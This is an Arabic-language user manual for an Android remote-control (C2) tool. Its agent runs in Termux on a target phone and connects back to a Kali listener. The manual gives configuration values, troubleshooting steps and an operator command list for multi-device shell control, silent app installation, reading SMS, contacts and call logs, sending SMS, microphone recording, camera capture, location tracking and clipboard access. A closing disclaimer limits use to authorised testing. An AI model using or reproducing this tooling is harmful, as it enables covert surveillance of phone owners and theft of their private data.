================================================================================
 1. نظرة عامة
================================================================================

Advanced Multi-Agent C2 هي أداة تحكم عن بُعد (C2) متعددة الوكلاء، مصممة
لاختبار الاختراق  على أجهزة Android 
تتكون الأداة من ملفين رئيسيين:

  • listener.py  — السيرفر (C2) الذي يعمل على Kali Linux.
  • agent.py     — الوكيل (Agent) الذي يعمل على جهاز Android المستهدف.

المميزات:
  ✅ تشفير AES-256-CBC لكل الرسائل
  ✅ دعم عدة وكلاء في نفس الوقت
  ✅ أوامر shell كاملة
  ✅ دعم Shizuku (تثبيت صامت للتطبيقات)
  ✅ دعم Termux:API (SMS, جهات اتصال, كاميرا, موقع)
  ✅ عرض عدد الأجهزة لحظيًا
  ✅ إعادة اتصال تلقائي عند الانقطاع
  ✅ نظام help كامل (عربي + إنجليزي)
  ✅ سجل جلسة في ملف log

 2. المتطلبات
================================================================================

────────────────────────────────────────────
 2.1 على Kali (السيرفر)
────────────────────────────────────────────
  • Python 3.8+
  • مكتبة pycryptodome:
      pip install pycryptodome

────────────────────────────────────────────
 2.2 على Android (الوكيل)
────────────────────────────────────────────
  • تطبيق Termux (من F-Droid — ليس Play Store)
  • Python:
      pkg install python
  • مكتبة pycryptodome:
      pip install pycryptodome
  • (اختياري) Termux:API من F-Droid
  • (اختياري) Shizuku من Play Store/F-Droid
  • (اختياري) rish للتحكم بـ Shizuku:
      wget https://raw.githubusercontent.com/RikkaApps/Shizuku-API/master/rish
      chmod +x rish && mv rish $PREFIX/bin/

 3. الإعداد
================================================================================

────────────────────────────────────────────
 3.1 في listener.py
────────────────────────────────────────────
  عدّل الإعدادات في أعلى الملف:

      LISTEN_HOST = "0.0.0.0"        # اسمح بالاتصال من أي واجهة
      LISTEN_PORT = 4444             # المنفذ
      SECRET_KEY  = b"..."           # 32 بايت بالضبط
      LOG_FILE    = "~/c2_session.log"

────────────────────────────────────────────
 3.2 في agent.py
────────────────────────────────────────────
  عدّل الإعدادات في أعلى الملف:

      C2_HOST = "192.168.8.120"      # IP جهاز Kali
      C2_PORT = 4444                 # نفس منفذ listener
      SECRET_KEY = b"..."            # ← نفس المفتاح تمامًا

  ⚠️ تحذير: SECRET_KEY يجب أن يكون متطابقًا حرفيًا في الملفين.
  أي اختلاف (حتى حرف واحد) سيؤدي إلى خطأ "Padding is incorrect".

  لتوليد مفتاح آمن:
      python3 -c "import secrets; print(secrets.token_bytes(32))"

 5. قائمة الأوامر الكاملة
================================================================================

────────────────────────────────────────────
 5.1 أوامر إدارة الوكلاء
────────────────────────────────────────────
  agents                     → عرض كل الأجهزة المتصلة
  count                      → عدد الأجهزة المتصلة
  use <id>                   → التبديل إلى جهاز معين
  current                    → عرض الجهاز الحالي
  send <id> <cmd>            → إرسال أمر لجهاز محدد
  broadcast <cmd>            → إرسال أمر لكل الأجهزة
  kill <id>                  → قطع اتصال جهاز معين

────────────────────────────────────────────
 5.2 أوامر محلية
────────────────────────────────────────────
  help                       → المساعدة (عربي + إنجليزي)
  help ar                    → المساعدة بالعربية فقط
  help en                    → المساعدة بالإنجليزية فقط
  help <category>            → مساعدة فئة معينة
  upload <path.apk>          → رفع APK إلى الجهاز الحالي
  getinfo                    → معلومات الجهاز الحالي
  clear                      → مسح الشاشة
  exit                       → إنهاء الجلسة
  save                       → حفظ الجلسة في ملف log

────────────────────────────────────────────
 5.3 أوامر Agent
────────────────────────────────────────────
  ┌─ التنقل ──────────────────────────────────────────────┐
  │ cd <path>       → تغيير المجلد الحالي (دائم)          │
  │ cd              → العودة إلى HOME                     │

  │ cat <file>      → قراءة ملف                           │

  └──────────────────────────────────────────────────────┘

  ┌─ معلومات ────────────────────────────────────────────┐

  ┌─ التطبيقات (Shizuku) ────────────────────────────────┐

  └──────────────────────────────────────────────────────┘

  │ shell:termux-location             → الموقع           │
  │ shell:termux-camera-photo -c 0 <path> → صورة         │
  │ shell:termux-microphone-record    → تسجيل صوت        │
  │ shell:termux-contact-list         → جهات الاتصال     │
  │ shell:termux-sms-list             → الرسائل          │
  │ shell:termux-sms-send             → إرسال SMS        │
  │ shell:termux-call-log             → سجل المكالمات    │
  │ shell:termux-clipboard-get        → الحافظة          │
  │ shell:termux-notification         → إشعار            │
  │ shell:termux-torch on             → الفلاش           │
  │ shell:termux-wifi-connectioninfo  → معلومات الواي فاي │

 7. استكشاف الأخطاء
================================================================================

────────────────────────────────────────────
 7.1 "Padding is incorrect"
────────────────────────────────────────────
  السبب: SECRET_KEY غير متطابق بين agent.py و listener.py.

  الحل:
      تأكد من تطابق المفتاح حرفيًا:
          grep "SECRET_KEY" listener.py
          grep "SECRET_KEY" agent.py

      أو استخدم نصًا مباشرًا (بدون base64):
          SECRET_KEY = b"ChangeThisKey32BytesLong!!!!!!"

────────────────────────────────────────────
 7.2 "no response or timeout"
────────────────────────────────────────────
  السبب: الـ Agent لا يرد على الأوامر.

  الحل:
      1. تأكد أن agent.py يستخدم نفس بروتوكول الطول:
             struct.pack("!I", len(enc))
      2. تحقق من أن الـ Agent لا يرسل heartbeat بشكل متزامن.
      3. أعد تشغيل الـ Agent.

────────────────────────────────────────────
 7.3 "Broken pipe"
────────────────────────────────────────────
  السبب: الاتصال انقطع بين الأمر والرد.

  الحل:
      1. تحقق من استقرار الشبكة.
      2. أعد الاتصال.

────────────────────────────────────────────
 7.4 "screencap: not found"
────────────────────────────────────────────
  السبب: screencap غير متوفر في $PATH الخاص بـ Termux.

  الحل:
      استخدم المسار الكامل:
          shell:/system/bin/screencap -p /sdcard/s.png

────────────────────────────────────────────
 7.5 "Permission denied" على /sdcard
────────────────────────────────────────────
  السبب: Termux لا يملك صلاحية الوصول لـ /sdcard.

  الحل:
      في Termux:
          termux-setup-storage
      ثم امنح الصلاحية.

────────────────────────────────────────────
 7.6 "rish: command not found"
────────────────────────────────────────────
  السبب: rish غير مثبت.

  الحل:
      wget https://raw.githubusercontent.com/RikkaApps/Shizuku-API/master/rish
      chmod +x rish
      mv rish $PREFIX/bin/

────────────────────────────────────────────
 7.7 "Shizuku not running"
────────────────────────────────────────────
  السبب: Shizuku غير مفعّل.

  الحل:
      1. افتح تطبيق Shizuku.
      2. اضغط "Start".
      3. اتبع التعليمات (Wireless Debugging أو ADB).

────────────────────────────────────────────
 7.8 "no such directory" عند cd
────────────────────────────────────────────
  السبب: المسار غير موجود.

  الحل:
      تأكد من المسار:
          shell:ls <parent_dir>

 8. الأمان
================================================================================

  ⚠️ تحذير قانوني

  هذه الأداة مصممة لاختبار الاختراق المصرّح به فقط على:
      • الأجهزة التي تملكها شخصيًا.
      • الأجهزة التي لديك إذن كتابي باختبارها.

  الاستخدام على أجهزة لا تملكها = جريمة إلكترونية في كل الدول.

  ⚠️ تحذيرات أمنية
      • لا تشارك SECRET_KEY مع أي شخص.
      • لا تشغّل الـ Listener على شبكة عامة.
      • استخدم VPN إذا كان الاتصال عبر الإنترنت.
      • غيّر SECRET_KEY كل فترة.
      • راقب سجل الجلسة ~/c2_session.log.
